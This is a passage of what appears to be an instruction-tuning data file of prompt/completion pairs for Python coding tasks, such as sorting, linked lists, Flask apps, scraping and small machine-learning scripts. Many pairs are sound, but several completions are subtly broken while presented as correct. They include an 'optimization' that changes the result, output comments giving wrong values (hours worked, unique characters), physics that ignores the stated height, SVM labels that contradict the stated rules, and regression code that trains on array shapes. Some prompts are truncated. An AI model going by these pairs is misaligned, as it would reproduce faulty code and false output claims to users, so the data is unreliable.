= 0 # Following code is used to print LCSuff[m+1][n+1] lcs_len = L[m][n] index = lcs_len # Create a character array to store the lcs string lcs = [\\"\\"] * (index+1) lcs[index] = \\"\\" # Set the terminating character # Start from the right-most-bottom-most corner i = m j = n while i > 0 and j > 0: # If current character in X[] and Y are same, # then current character is part of LCS if str1[i-1] == str2[j-1]: lcs[index-1] = str1[i-1] i-=1 j-=1 index-=1 # If not same, then find the larger of two and # go in the direction of larger value elif L[i-1][j] > L[i][j-1]: i-=1 else: j-=1 lcs_str = \\"\\".join(lcs) print(lcs_str) # Driver program if __name__ == \\"__main__\\": string1 = \\"OldSite:Geeksforgeeks.org\\" string2 = \\"Newsite:Geeks.com\\" LongestCommonString(string1, string2)"},{"prompt":"Create a program to merge two sorted arrays in Python. [3, 5, 7], [1, 2, 4]","completion":"def mergeSortedArrays(arr1, arr2): l1 = len(arr1) l2 = len(arr2) l = l1 + l2 arr = [0] * l i = 0 j = 0 k = 0 while (i < l1 and j < l2): if (arr1[i] < arr2[j]): arr[k] = arr1[i] k = k + 1 i = i + 1 else: arr[k] = arr2[j] k = k + 1 j = j + 1 while (i < l1): arr[k] = arr1[i] k = k + 1 i = i + 1 while (j < l2): arr[k] = arr2[j] k = k + 1 j = j + 1 return arr arr1 = [3, 5, 7] arr2 = [1, 2, 4] print(mergeSortedArrays(arr1, arr2))"},{"prompt":"mplement the quicksort algorithm in Python.","completion":"def quicksort(numbers): ''' This function implements the quicksort algorithm to sort a given array of numbers. Args: numbers (list): the array of numbers to be sorted Returns: list: the sorted array ''' if len(numbers) == 0: return [] # pivot will be the middle element of the list pivot = numbers[0] left = [x for x in numbers[1:] if x < pivot] right = [x for x in numbers[1:] if x >= pivot] return quicksort(left) + [pivot] + quicksort(right)"},{"prompt":"mplement a linked list using Python.","completion":"class Node: # Function to initialize the node object def __init__(self, data): self.data = data # Assign data self.next = None # Initialize next as null class LinkedList: # Function to initialize head def __init__(self): self.head = None"},{"prompt":"Create an algorithm in Python 3 to identify the characters in a given string. Abe erotically jitters","completion":"def identify_characters(s): characters = [] for char in s: if char not in characters: characters.append(char) return characters print(identify_characters('Abe erotically jitters')) #['A', 'b', 'e', ' ', 'r', 'o', 't', 'i', 'c', 'a', 'l', 'y', 'j', 'i', 't', 's']"},{"prompt":"Write a Python program to display the multiplication table of a given number.","completion":"def multiplication_table(n): print('Multiplication Table of ', n) for i in range(1, 11): product = i * n print('{0} x {1} = {2}'.format(i, n, product))"},{"prompt":"Generate a python program to find the year of the oldest movie [{'title': 'The matrix', 'releaseYear': 1999 }, {'title': 'Titanic', 'releaseYear': 1997 }, {'title': 'Transformers', 'releaseYear': 2006 }, {'title': 'WallE', 'releaseYear': 2008 }]","completion":"def oldest_movie(movies): oldest_year = movies[0][\\"releaseYear\\"] for movie in movies: if movie[\\"releaseYear\\"] < oldest_year: oldest_year = movie[\\"releaseYear\\"] return oldest_year"},{"prompt":"Develop a Python code for computing the length of a string.","completion":"def get_length(string): length = 0 for char in string: length += 1 return length"},{"prompt":"Create a program in Python that takes an array of integers and prints the first odd number from the left side. arr = [1, 4, 5, 6, 9, 10, 11]","completion":"def first_odd(arr): for num in arr: if num % 2 != 0: print(num) break arr = [1, 4, 5, 6, 9, 10, 11] first_odd(arr)"},{"prompt":"Edit the following Python code to ensure the program runs successfully list = [1, 5, 6, 8] for i in range[list]: print(i)","completion":"list = [1, 5, 6, 8] for i in list: print(i)"},{"prompt":"Build a web application using Python and Flask that displays the current date and time.","completion":"from flask import Flask from datetime import datetime app = Flask(__name__) @app.route('/') def homepage(): the_time = datetime.now().strftime(\\"%A, %d %b %Y %l:%M %p\\") return \\"\\"\\" <h1>Current Date and Time</h1> <p>It is currently {time}.</p> <p>The local timezone is {timezone}.</p> \\"\\"\\".format(time = the_time, timezone = datetime.now().strftime(\\"%Z\\")) if __name__ == '__main__': app.run(debug=True)"},{"prompt":"Write a Python code that takes a given list of numbers and returns the mode of that list. List = [1,2,3,4,2,2,2,5]","completion":"def find_mode(List): max_count = 0 modes = [] for num in List: current_count = List.count(num) if current_count > max_count: max_count = current_count modes = [num] elif current_count == max_count: modes.append(num) return modes"},{"prompt":"Develop a Python program to sort a 3D array according to the second axis in ascending order. [[[1,6,4], [4,3,2], [2,3,6]], [[3,3,3], [2,2,2], [1,1,1]]]","completion":"def sort_array(arr): arr.sort(key=lambda x: x[1]) return arr data = [[[1,6,4], [4,3,2], [2,3,6]], [[3,3,3], [2,2,2], [1,1,1]]] print(sort_array(data))"},{"prompt":"Compute the greatest common divisor of two numbers with Python. a = 24 b = 36","completion":"def gcd(a, b): if (a == 0): return b return gcd(b % a, a) print (\\"GCD(\\", a, \\",\\", b, \\") = \\", gcd(a, b))"},{"prompt":"Create a Python program to retrieve the hours worked by an employee from a given list of timestamps. [1577296930, 1577297490, 1577299030]","completion":"def total_hours(timestamps): total_hours = 0 for i in range(1, len(timestamps)): total_hours += (timestamps[i] - timestamps[i-1]) / 3600 return total_hours timestamps = [1577296930, 1577297490, 1577299030] print(total_hours(timestamps)) # Output should be 3.33"},{"prompt":"Develop a CPU scheduling algorithms in Python that will schedule process based on their remaining time. No input required","completion":"# Define the CPU scheduling algorithms def schedule_processes(processes): # sort the process list on the basis of their remaining times processes.sort(key = lambda x: x.remaining_time) # initialize the scheduled list scheduled = [] # iterate each and every process while len(processes) > 0: current_process = processes.pop(0) # append the current process to the scheduled list scheduled.append(current_process) # iterate through the other processes and reduce # their remaining time by 1 for process in processes: if process.remaining_time > 1: process.remaining_time -= 1 return scheduled"},{"prompt":"Create a machine learning model in Python that predicts the type of animal based on certain features such as size, color, and behavior. Not applicable","completion":"# Imports import pandas as pd from sklearn.model_selection import train_test_split from sklearn.ensemble import RandomForestClassifier # Get data data = pd.read_csv('animal_data.csv') # Extract features features = data[['size','color','behavior']] # Extract target target = data['type'] # Split the data x_train, x_test, y_train, y_test = train_test_split(features, target, test_size=0.20, random_state=42) # Create and train the model model = RandomForestClassifier() model.fit(x_train, y_train) # Print the accuracy of the model print(\\"Model accuracy: %f\\" % model.score(x_test, y_test))"},{"prompt":"Optimize the following Python code to reduce running time. def add_arrays(arr1, arr2): result = [] for i in range(len(arr1)): result.append(arr1[i] + arr2[i]) return result Not applicable","completion":"def add_arrays(arr1, arr2): return [x + y for x, y in zip(arr1, arr2)]"},{"prompt":"Create an array of 100 randomly generated integers using Python.","completion":"import random my_array = [random.randint(1, 100) for _ in range(100)]"},{"prompt":"Create a program in Python to split a string into a list by given character string = 'This is a sample string'","completion":"def split_string(string, delimiter): return string.split(delimiter) print(split_string('This is a sample string', ' '))"},{"prompt":"Design a neural model for text classification in Python.","completion":"import torch import torch.nn as nn class TextClassificationModel(nn.Module): def __init__(self, vocab_size, embedding_dim, output_dim, dropout): super().__init__() self.embedding = nn.Embedding(vocab_size, embedding_dim) self.fc = nn.Linear(embedding_dim, output_dim) self.dropout = nn.Dropout(dropout) def forward(self, x): embedded = self.embedding(x) embedded = self.dropout(embedded) logits = self.fc(embedded) return logits"},{"prompt":"Convert the following python class to XML format. class Person: def __init__(self, name, age): self.name = name self.age = age","completion":"<?xml version=\\"1.0\\" ?> <person> <name>{self.name}</name> <age>{self.age}</age> </person>"},{"prompt":"Create a Python program to parse a given XML document and extract specific elements. XML Document: <books> <book> <title>The Hobbit</title> <author>J.R.R Tolkein</author> </book> <book> <title>Harry Potter and the Sorcerers Stone</title> <author>J.K Rowling</author> </book> </books>","completion":"import xml.etree.ElementTree as ET xml_file_path = 'books.xml' tree = ET.parse(xml_file_path) root = tree.getroot() for book in root.findall('book'): title = book.find('title').text author = book.find('author').text print('Title: ', title) print('Author: ', author)"},{"prompt":"Create a Python function to delete the last character of a given string. Hello World!","completion":"def delete_last_char(string): \\"\\"\\"Delete the last character of a given string. Args: string (str): The string to remove the last character from. Returns: str: The string with the last character removed. \\"\\"\\" return string[:-1] if __name__ == '__main__': string = \\"Hello World!\\" result = delete_last_char(string) print(result)"},{"prompt":"Create a Python dictionary from two given lists. The first list contains keys and the second list contains values. keys = [1, 2, 3, 4, 5] values = [4, 5, 6, 7, 8]","completion":"dict_from_lists = dict(zip(keys, values))"},{"prompt":"Generate a Python Program to Sort a List by Frequency list_a = [1, 2, 3, 2, 5, 2]","completion":"def sort_by_frequency(list_a): frequency = {} for a in list_a: if a not in frequency: frequency[a] = 1 else: frequency[a] += 1 list_sorted = [] for key, value in sorted(frequency.items(), key=lambda item: item[1], reverse=True): for _ in range(value): list_sorted.append(key) return list_sorted"},{"prompt":"Create a Python program that uses a loop to produce the following output. Not applicable","completion":"for i in range(1,11): if i % 2 == 0: print('{} is even'.format(i)) else: print('{} is odd'.format(i))"},{"prompt":"Generate a program in Python to calculate the area of a circle given its radius. 5.5","completion":"import math def calculate_area_of_circle(radius): area = math.pi * radius ** 2 return area result = calculate_area_of_circle(5.5) print('The area of the circle is: ', result)"},{"prompt":"Create a program in Python that takes a given string and returns a dictionary whose keys are the words in the string and values are the number of occurances of each word. String = Hello world, This is me","completion":"def word_count(string): count = {} string = string.split() for word in string: if word in count: count[word] += 1 else: count[word] = 1 return count print(word_count(\\"Hello world, This is me\\"))"},{"prompt":"Write a function in Python 3 which takes an input integer n and returns an array of n random numbers.","completion":"import random def generate_random_nums(n): nums = [] for _ in range(n): nums.append(random.randint(0,n)) return nums"},{"prompt":"Optimize the following code in Python to reduce its complexity. def my_function(n): result = 0 for i in range(n): for j in range(n): for k in range(n): result = result + i * j * k return resul","completion":"def my_function(n): result = 0 # Loop through all possible pairs of i and j for i in range(n): for j in range(n): # Multiply each pair and add it to the result result += i * j * (n - 1) return result"},{"prompt":"Create a Python class representing a linked list.","completion":"class Node: def __init__(self, data): self.data = data self.next = None class LinkedList: def __init__(self): self.head = None def push(self, new_data): new_node = Node(new_data) new_node.next = self.head self.head = new_node def print_list(self): temp = self.head while (temp): print(temp.data) temp = temp.next list = LinkedList() list.push(1) list.push(2) list.push(3) list.push(4) list.print_list()"},{"prompt":"Write a Python program to print the even numbers from 1 to 50 Not applicable","completion":"for i in range(1,51): if (i % 2 == 0): print(i)"},{"prompt":"Generate a function in Python that takes a number as input and prints out the nth Fibonacci number. 6","completion":"def nthFibonacciNumber(n): if n==0: return 0 elif n==1: return 1 else: return nthFibonacciNumber(n-1)+nthFibonacciNumber(n-2) result = nthFibonacciNumber(6) print(result)"},{"prompt":"Create a Python script to scrape a given web page and store the data in a dictionary. The URL: https://en.wikipedia.org/wiki/Python_(programming_language)","completion":"import requests from bs4 import BeautifulSoup url = args[0] response = requests.get(url) data = {} if response.status_code == 200: html = response.text soup = BeautifulSoup(html, 'html.parser') for heading in soup.find_all(['h1', 'h2', 'h3', 'h4', 'h5', 'h6']): data[heading.text] = heading.next_sibling.next_sibling.text print(data)"},{"prompt":"Write a Python script to optimize an algorithm for finding a specific element in a list.","completion":"def find_element(input_list,element): for index, val in enumerate(input_list): if val == element: return index def optimized_find_element(input_list,element): low,high=0,len(input_list)-1 while low <= high: mid = (low + high) // 2 if input_list[mid] == element: return mid elif element > input_list[mid]: low = mid + 1 else: high = mid - 1 return -1 input_list = [1,2,3,4,5,6,7,8,9] element = 7 index = find_element(input_list,element) print(index) index = optimized_find_element(input_list,element) print(index)"},{"prompt":"Generate an automated unit test in Python for the following function def add(a, b): return a + b","completion":"import unittest class TestAddition(unittest.TestCase): def test_addition(self): self.assertEqual(add(1, 1), 2) self.assertEqual(add(2, 5), 7) self.assertEqual(add(3, 3), 6) self.assertEqual(add(-8, 6), -2) self.assertEqual(add(-3, -3), -6) if __name__ == '__main__': unittest.main()"},{"prompt":"Upload a webpage to a web server using a Python program.","completion":"import requests url = 'http://<web server address>' file = {'webpage': open('index.html', 'rb')} response = requests.post(url, files=file) print(response.status_code)"},{"prompt":"Write a Python function which takes in an argument and returns a corresponding string. Given an argument of 1,2 or 3","completion":"def get_string(arg): \\"\\"\\" This function takes in an argument and returns the corresponding string. Parameters: arg (int): the argument Returns: str: the corresponding string \\"\\"\\" if arg == 1: return \\"One\\" elif arg == 2: return \\"Two\\" elif arg ==3: return \\"Three\\" else: return \\"\\""},{"prompt":"Design a data structure in Python that can store employee information.","completion":"class Employee: \\"\\"\\"This class stores the information of an employee\\"\\"\\" def __init__(self, name, id, salary, department): self.name = name self.id = id self.salary = salary self.department = department"},{"prompt":"You need to write a Python code to revert a given list back to its original form. my_list = [3, 2, 1, 4]","completion":"my_list = my_list[::-1]"},{"prompt":"Write a python script to format a list of numbers into a tabular form. [2, 3, 4, 5, 6]","completion":"def format_list(list_in): list_out = [] for n in list_in: list_out.append('|'+str(n).ljust(2)+'|') header = '--|--+' header_line = '--|'+'--'*len(list_out)+'|' list_out = [header] + list_out + [header_line] return 'n'.join(list_out) print(format_list([2, 3, 4, 5, 6])) # Output: --|--+ |2 | |3 | |4 | |5 | |6 | --|---|"},{"prompt":"Create a method in Python which takes a string and an integer as arguments and returns an integer representing the number of times that character appears. s = hello world, c = 'l'","completion":"def findCount(s, c): count = 0 for char in s: if char == c: count += 1 return count print(findCount(s, c))"},{"prompt":"Generate a list of combinations of three numbers from a given array in Python. [1, 2, 3, 4, 5]","completion":"combinations = [] for i in range(len(arr)): for j in range(i+1, len(arr)): for k in range(j+1, len(arr)): combinations.append([arr[i], arr[j], arr[k]])"},{"prompt":"Write a Python program to calculate the factorial of a number. number = 6","completion":"def factorial(number): if number == 0: return 1 else: return number * factorial(number-1) number = 6 print(factorial(number)) # Output: 720"},{"prompt":"Develop a RNN in Python to classify a given text as Positive, Neutral or Negative. This is a very good restaur","completion":"import tensorflow as tf from tensorflow.keras.preprocessing.text import Tokenizer from tensorflow.keras.preprocessing.sequence import pad_sequences # Preprocessing tokenizer = Tokenizer() tokenizer.fit_on_texts([text]) words = tokenizer.word_index sequence = tokenizer.texts_to_sequences([text]) padded_sequence = pad_sequences(sequence, maxlen=20) # Network Architecture model = tf.keras.Sequential([ tf.keras.layers.Embedding(len(words)+1, 32, input_length=20), tf.keras.layers.LSTM(64), tf.keras.layers.Dense(3, activation='softmax') ]) # Training the model model.compile(optimizer='adam', loss='categorical_crossentropy', metrics=['accuracy']) model.fit(padded_sequence, labels, epochs=10)"},{"prompt":"Create a Python program for simulating a bouncing ball with a bouncing height of 10 meters. The program should print out the time at which the ball reaches the ground. The initial velocity of the ball is 20 m/s.","completion":"import math # initial velocity v0 = 20 # height h = 10 # time to reach ground t = (v0 * 2) / 9.81 print(\\"The ball will reach the ground in {:.2f} seconds\\".format(t))"},{"prompt":"Generate a Python program to classify text documents by topic. text = [The quick brown fox jumps over the lazy dog., This is a sample text used to determine how well the classification model works., This text belongs to the Animal topic.]","completion":"import sklearn from sklearn.feature_extraction.text import CountVectorizer from sklearn.preprocessing import LabelEncoder from sklearn.naive_bayes import MultinomialNB # Sentences sentences = [] sentences.append(\\"The quick brown fox jumps over the lazy dog.\\") sentences.append(\\"This is a sample text used to determine how well the classification model works.\\") sentences.append(\\"This text belongs to the Animal topic.\\") # Topics topics = [\\"Animal\\",\\"Sports\\",\\"Weather\\"] # Create feature vectors vectorizer = CountVectorizer(stop_words='english') X = vectorizer.fit_transform(sentences).toarray() # Create label encoder label_encoder = LabelEncoder() y = label_encoder.fit_transform(topics) # Instantiate the model classifier = MultinomialNB() classifier.fit(X, y) # Classify new sample sample = vectorizer.transform([\\"A warm and sunny day\\"]).toarray() prediction = classifier.predict(sample) print(prediction) print(label_encoder.inverse_transform(prediction))"},{"prompt":"Write a python code to list all the substrings of a given string. input_string=abcde","completion":"def substrings(input_string): # Get the length of the string length = len(input_string) # List of all substrings substrings = [] # Iterate over the length of the input string for i in range(length): # Iterate over the length of the input string # minus the start index for j in range(i, length): # Get substring sub = input_string[i:j + 1] # Add substring to the list substrings.append(sub) return substrings if __name__ == '__main__': output = substrings(\\"abcde\\") print(output)"},{"prompt":"Use Python to clean a dataset of customer reviews to make it ready for analysis. The dataset is a csv file and includes columns for the customer name, review title, review content, and rating.","completion":"import pandas as pd # read csv file df = pd.read_csv('customer_reviews.csv') # lower case the reviews and titles df['Review_content'] = df['Review_content'].str.lower() df['Review_title'] = df['Review_title'].str.lower() # remove punctuation df['Review_content'] = df['Review_content'].str.replace('[^ws]','') df['Review_title'] = df['Review_title'].str.replace('[^ws]','') # stem words in review content from nltk.stem import PorterStemmer stemmer = PorterStemmer() def stem_words(row): words = row.split() stemmed_words = [stemmer.stem(word) for word in words] return ' '.join(stemmed_words) df['Review_content'] = df['Review_content'].apply(stem_words) # remove stopwords from nltk.corpus import stopwords stop_words = set(stopwords.words('english')) def remove_stopwords(row): words = row.split() filtered_words = [word for word in words if word not in stop_words] return ' '.join(filtered_words) df['Review_content'] = df['Review_content'].apply(remove_stopwords) # save clean dataset df.to_csv('clean_reviews.csv', index=False)"},{"prompt":"Construct an algorithm in Python to sort the elements of an array in decreasing order. [4, 7, 1, 3, 5, 2]","completion":"def sortDecreasing(arr): for i in range(len(arr)): for j in range(i+1, len(arr)): if arr[i] < arr[j]: arr[i], arr[j] = arr[j], arr[i] return arr arr = [4, 7, 1, 3, 5, 2] print(sortDecreasing(arr)) # Output: [7, 5, 4, 3, 2, 1]"},{"prompt":"Write a Python program to convert a given number of days into years, months and days. Days = 500","completion":"def convert_days_wm(Days): y = Days//365 m = (Days%365)//30 d = (Days%365)%30 return y, m, d"},{"prompt":"Generate a code for the following regression problem in Python. Input data shape : (1000,10) Label data shape : (1000,1)","completion":"# Importing necessary libraries import pandas as pd import numpy as np # Defining input and label datasets x = np.array(pd.read_csv(\\"input.csv\\")).shape[1] y = np.array(pd.read_csv(\\"labels.csv\\")).shape[1] # Training and testing splitting from sklearn.model_selection import train_test_split x_train, x_test, y_train, y_test = train_test_split(x, y, test_size=0.2, random_state=42) # Importing LinearRegression from sklearn from sklearn.linear_model import LinearRegression # Initializing the Model linear_model = LinearRegression() # Fitting the Model linear_model.fit(x_train, y_train) # Predicting on given test data y_pred = linear_model.predict(x_test)"},{"prompt":"Create a program in Python to calculate the prime factors of a given number. 15","completion":"def find_factors(num): \\"\\"\\"Function to find prime factors\\"\\"\\" factors = [] i = 2 while i * i <= num: if num % i: i += 1 else: num //= i factors.append(i) if num > 1: factors.append(num) return factors num = 15 print(find_factors(num))"},{"prompt":"Create a Python class that allows users to check if a given number is prime.","completion":"class PrimeChecker: def is_prime(self, num): if num <= 1: return False for i in range(2, int(num**0.5) + 1): if num % i == 0: return False return True"},{"prompt":"Provide an example of how to generate a keyvalue Python dictionary from a list.","completion":"my_list = [1, 2, 3, 4] my_dict = {list_val:list_val**2 for list_val in my_list} print(my_dict) # {1: 1, 2: 4, 3: 9, 4: 16}"},{"prompt":"What Python code is needed to multiply two numbers and return the result?","completion":"def multiply(num1, num2): return num1 * num2"},{"prompt":"Write a function in Python that counts the number of words in a given sentence.","completion":"def word_count(sentence): count = 0 for word in sentence.split(' '): count += 1 return count"},{"prompt":"Create a program in Python for generating a Fibonacci sequence.","completion":"# Generate a Fibonacci sequence # Function to generate Fibonacci sequence def Fibonacci(n): if n < 0: print(\\"Incorrect input\\") elif n == 1: return 0 elif n == 2: return 1 else: return Fibonacci(n-1) + Fibonacci(n-2) # Print the sequence upto n terms terms = 10 print(\\"Fibonacci sequence:\\") for num in range(1, terms + 1): print(Fibonacci(num))"},{"prompt":"Develop a Python program that takes in an URL and extracts all the text content from the page. 'https://www.example.com/'","completion":"import requests from bs4 import BeautifulSoup url = 'https://www.example.com/' page = requests.get(url) html = BeautifulSoup(page.content, 'html.parser') texts = [] for txt in html.find_all('p'): texts.append(txt.text) print(texts)"},{"prompt":"Construct an algorithm in Python to determine whether a given array A[1...N] can be partitioned such that the sum of elements in both partitions is equal. Array: [1, 5, 11, 5]","completion":"def partition_equal(arr): total = sum(arr) if total % 2 != 0: return False half = total//2 n = len(arr) dp = [[False for _ in range(half+1)] for _ in range(n+1)] for i in range(n+1): dp[i][0] = True for j in range(1,half+1): dp[0][j] = False for i in range(1, n+1): for j in range(1, half+1): if arr[i-1] <= j: dp[i][j] = dp[i-1][j-arr[i-1]] or dp[i-1][j] else: dp[i][j] = dp[i-1][j] return dp[n][half]"},{"prompt":"Using the given Python class, generate equivalent Java code. class Car: def __init__(self, name, color): self.name = name self.color = color","completion":"public class Car { // Initialize class fields private String name; private String color; // Constructor public Car(String name, String color) { this.name = name; this.color = color; } // Getter and setter methods public String getName() { return name; } public String getColor() { return color; } public void setName(String name) { this.name = name; } public void setColor(String color) { this.color = color; } }"},{"prompt":"w do you find the length of a string in Python?","completion":"We can use the built-in len() function to find the length of a string in Python. The len() function takes the string as an argument and returns the length of the string, i.e. the number of characters in the string. Example: string = \\"Hello\\" string_length = len(string) print(string_length) #Output: 5"},{"prompt":"Design a structure in Python to store data related to airport schedules.","completion":"class FlightSchedule: def __init__(self): self.airport_info ={} def add_flight(self,flight_name,source,destination,departure_time,arrival_time): self.airport_info[flight_name] = { 'source': source, 'destination': destination, 'departure_time': departure_time, 'arrival_time': arrival_time } def get_flight_info(self,flight_name): if flight_name in self.airport_info: return self.airport_info[flight_name] else: return 'Flight does not exist.'"},{"prompt":"Write a Python algorithm to implement Breadth First Search (BFS).","completion":"def bfs(graph, start): visited, queue = set(), [start] while queue: vertex = queue.pop(0) if vertex not in visited: visited.add(vertex) queue.extend(graph[vertex] - visited) return visited"},{"prompt":"Generate a twodimensional array of ones using Python. r = 4, c = 5","completion":"import numpy as np arr = np.ones((r,c))"},{"prompt":"Create an SVM in Python to classify the Minnesota Monthly Rainfall dataset into 4 classes based on the following conditions: Class 0: rain >= 8 inches Class 1: 3 inches < rain < 8 inches Class 2: 1 inch < rain < 3 inches Class 3: rain <= 1 inch [1.09, 2.31, 4.7, 9.58, 11.19]","completion":"import numpy as np from sklearn import svm # Data x = np.array([1.09, 2.31, 4.7, 9.58, 11.19]) y = np.array([0, 1, 2, 3, 3]) # SVM model = svm.SVC(kernel='linear') model.fit(x.reshape(-1, 1), y) # Predict pred = model.predict([1.29, 2.5, 3.4, 4.8, 8.1, 9.3]) print(pred) # [1, 2, 2, 1, 0, 0]"},{"prompt":"Using Python, create a basic web application for a Contact List. The application should include a form for adding, editing, and deleting contacts. Not applicable","completion":"import os from flask import Flask, render_template, request app = Flask(__name__) contact_list = [ {'name': 'John Doe', 'email': 'john@example.com'}, {'name': 'Jane Doe', 'email': 'jane@example.com'}, ] @app.route('/') def index(): return render_template('index.html', contacts=contact_list) @app.route('/add', methods=['POST']) def add(): if request.form['name'] and request.form['email']: contact_list.append((request.form['name'], request.form['email'])) return redirect(url_for('index')) @app.route('/edit/<int:key>', methods=['GET', 'POST']) def edit(key): if request.method == 'POST': contact_list[key] = (request.form['name'], request.form['email']) return redirect(url_for('index')) return render_template('edit.html', key=key, contact=contact_list[key]) @app.route('/delete/<int:key>', methods=['GET', 'POST']) def delete(key): if request.method == 'POST': del contact_list[key] return redirect(url_for('index')) return render_template('delete.html', key=key, contact=contact_list[key]) if __name__ == '__main__': app.run(host=os.environ.get('IP'), port=os.environ.get('PORT'), debug=True)"},{"prompt":"Generate a Python program to solve the Traveling Salesman Problem using the nearest neighbor algorithm. City Locations city1 (1, 2) city2 (3, 4) city3 (5, 6) city4 (7, 8) etc.","completion":"import math def get_nearest_neighbour(start_city, city_list): neighbour = None shortest_distance = math.inf for city in city_list: dist = math.sqrt((city[0] - start_city[0])**2 + (city[1] - start_city[1])**2) if dist < shortest_distance: shortest_distance = dist neighbour = city return neighbour def solve_tsp(start_city, city_list): current_city = start_city path = [start_city] while len(city_list) > 0: next_city = get_nearest_neighbour(current_city, city_list) path.append(next_city) city_list.remove(next_city) current_city = next_city return path start_city = (1, 2) city_list = [(3, 4), (5, 6), (7, 8)] solution = solve_tsp(start_city, city_list) print(solution)"},{"prompt":"Describe how to create a web service for a database.","completion":"A web service for a database can be created by writing an application layer that accepts requests from a client, queries the database, and returns the results back to the client. The application layer can be written using a language that is supported by the database's driver, such as Java or Python. The application layer should also handle security, user authentication, and access control."},{"prompt":"Given a set of data points, write a Python program to calculate the Pearson correlation coefficient between two variables. Data points: (2,6), (4,8), (7,12), (9,14)","completion":"import numpy as np # define the dataset data = np.array([[2,6], [4,8], [7,12], [9,14]]) # calculate the Pearson correlation coefficient def pearson_coefficient(x, y): x_mean = np.mean(x) y_mean = np.mean(y) num = np.sum((x - x_mean)*(y - y_mean)) den = np.sqrt(np.sum(np.square(x - x_mean)) * np.sum(np.square(y - y_mean))) return num/den x = data[:, 0] y = data[:, 1] pearson_r = pearson_coefficient(x, y) print('Pearson correlation coefficient: %.3f' % pearson_r) # Output: Pearson correlation coefficient: 0.998"},{"prompt":"Create a Python program that displays the country, population and area of the given data. data = [{'country':'India', 'population':1378350000, 'area':3287590}, {'country':'China', 'population':1403500000, 'area':9596961}]","completion":"data = [{'country':'India', 'population':1378350000, 'area':3287590}, {'country':'China', 'population':1403500000, 'area':9596961}] for item in data: print(\\"Country:\\",item['country'], \\",Population:\\", item['population'] , \\",Area:\\", item['area'])"},{"prompt":"Generate a list of prime numbers using Python.","completion":"primes = [] for num in range(2, 100): # all prime numbers are greater than 1 if num > 1: for i in range(2, num): if (num % i) == 0: break else: primes.append(num)"},{"prompt":"Develop a Python script to calculate the sum of the squares of all elements in a given array. [1, 2, 3]","completion":"def sum_of_squares(arr): sum = 0 for num in arr: sum += num*num return sum arr = [1,2,3] sum_of_squares = sum_of_squares(arr) print(sum_of_squares)"},{"prompt":"Write a Python program to scrape a website and store the data into MongoDB. The website URL: https://www.example.com","completion":"import requests from bs4 import BeautifulSoup import pymongo url = \\"https://www.example.com\\" # requesting data response = requests.get(url) # parse data soup = BeautifulSoup(response.text, 'lxml') # connect to MongoDB server myclient = pymongo.MongoClient(\\"mongodb://localhost:27017/\\") # create a MongoDB database mydb = myclient[\\"mydatabase\\"] # create a collection in the database mycol = mydb[\\"mycollection\\"] # retrieve and store every page's content in the MongoDB database for div in soup.find_all('div', class_=\\"box\\"): title = div.h3.text description = div.p.text data = { \\"title\\": title, \\"description\\": description } mycol.insert_one(data)"},{"prompt":"Create a Python function which takes a list, and prints out the third item of the list. mylist = [1, 2, 3, 4, 5]","completion":"def thirdElement(mylist): \\"\\"\\" Print out the third element of the list. \\"\\"\\" print(mylist[2]) thirdElement(mylist)"},{"prompt":"Create a Python class to represent a family tree.","completion":"class FamilyTree: def __init__(self): self.nodes = [] def add_node(self, node): self.nodes.append(node) def get_all_descendants(self, node): descendants = [] for n in self.nodes: if n.parent == node: descendants.append(n) descendants.extend(self.get_all_descendants(n)) return descendants"},{"prompt":"Create a function in Python to print all the prime numbers in an array. array = [2, 4, 6, 7, 11, 15]","completion":"def print_primes(arr): for i in arr: if i > 1: for j in range(2,i): if (i % j) == 0: break else: print(i) print_primes(array)"},{"prompt":"Revise a given Python code snippet to make it more efficient and performant. def calculate_sum(arr): sum = 0 for i in range(len(arr)): sum += arr[i] return sum","completion":"def calculate_sum(arr): return sum(arr)"},{"prompt":"Use Python to create an array that stores the Fibonacci sequence up to the nth number. n = 10","completion":"def fibonacci(n): a = 0 b = 1 fibo = [] for i in range(n): fibo.append(a) c = a + b a = b b = c return fibo fibonacci(10)"},{"prompt":"Compose a Python program to train a neural network using a given dataset. The dataset contains 10,000 examples and 5 features.","completion":"import numpy as np import keras from keras.models import Sequential from keras.layers import Dense # define the model model = Sequential() model.add(Dense(5, activation='relu', input_dim=5)) model.add(Dense(8, activation='relu')) model.add(Dense(1, activation='sigmoid')) # compile the model model.compile(loss='binary_crossentropy', optimizer='adam', metrics=['accuracy']) # load the data X = np.loadtxt('data.txt', delimiter=',') # fit the model with input data model.fit(X, y, epochs=50)"},{"prompt":"Given 2 integers, write a Python program to check whether the numbers are divisible. Number1: 5 Number2: 10","completion":"def is_divisible(num1, num2): if num1 % num2 == 0: return True else: return False check_result = is_divisible(5, 10) if check_result == True: print(\\"The numbers are divisible\\") else: print(\\"The numbers are not divisible\\")"},{"prompt":"Write Python program to convert a temperature (in Fahrenheit) into Celsius. Temp in Fahrenheit = 98","completion":"temp_in_fahrenheit = 98 temp_in_celsius = (temp_in_fahrenheit - 32) * 5/9 print(f'{temp_in_fahrenheit} Fahrenheit = {temp_in_celsius:.2f} Celsius')"},{"prompt":"Design a program in Python to check whether an input number is a prime number.","completion":"def is_prime(n): for i in range(2,n): if n % i == 0: return False return True"},{"prompt":"Create an optimization problem in Python to maximize a function subject to constraints.","completion":"import numpy as np from scipy.optimize import minimize # Define objective function def objective(x): return x[0]*x[3]*(x[0]+x[1]+x[2])+x[2] # Define constraints def constraint1(x): return x[0]*x[1]*x[2]*x[3]-25.0 def constraint2(x): sum_eq = 40.0 for i in range(4): sum_eq = sum_eq - x[i]**2 return sum_eq # Initial guesses x0 = [1,5,5,1] # Bounds b = (1.0,5.0) bnds = (b, b, b, b) # Constraints con1 = {'type': 'ineq', 'fun': constraint1} con2 = {'type': 'eq', 'fun': constraint2} cons = ([con1, con2]) # Solve problem solution = minimize(objective, x0, method='SLSQP', bounds=bnds, constraints=cons) # Print solution print(solution)"},{"prompt":"Optimize a Python program that squares an array of integers so that it consumes the least possible memory. Not applicable","completion":"def square_array(a): res = [x ** 2 for x in a] return res"},{"prompt":"Develop a function in Python for analyzing a given text and generating a statistical report for finding the word frequencies in the text.","completion":"def generate_freq_report(text): words = {} # to store the word frequencies text = text.lower() text = text.replace('n', ' ') text = text.split(' ') for word in text: if word in words: words[word] += 1 else: words[word] = 1 return words"},{"prompt":"Write a Python program to perform linear search on a given array of numbers. [2, 3, 4, 6, 1]","completion":"def linearSearch(arr, x): for i in range (len(arr)): if arr[i] == x: return i return -1 arr = [2, 3, 4, 6, 1] x = 4 result = linearSearch(arr, x) if(result == -1): print(\\"Element is not present in array\\") else: print(\\"Element is present at index\\", 